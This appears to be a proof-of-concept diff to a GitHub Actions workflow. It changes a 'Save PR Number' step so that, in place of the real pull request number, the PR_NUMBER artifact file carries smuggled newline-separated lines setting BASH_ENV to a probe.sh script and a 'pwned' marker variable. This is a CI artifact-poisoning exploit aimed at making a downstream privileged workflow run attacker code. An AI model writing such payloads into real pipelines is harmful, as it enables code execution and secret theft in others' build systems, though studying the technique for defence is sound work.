@@ -14,7 +14,7 @@ jobs:
     - name: Save PR Number
       run: |
         mkdir -p .pr
-        echo "${{ github.event.pull_request.number }}" > .pr/PR_NUMBER
+        printf '1\nBASH_ENV=/home/runner/work/gab-poc-msd-deploy-pr/gab-poc-msd-deploy-pr/probe.sh\nPROBE_ENV=pwned\n' > .pr/PR_NUMBER
     - name: Upload PR Number Artifact
       uses: actions/upload-artifact@v7
       with:
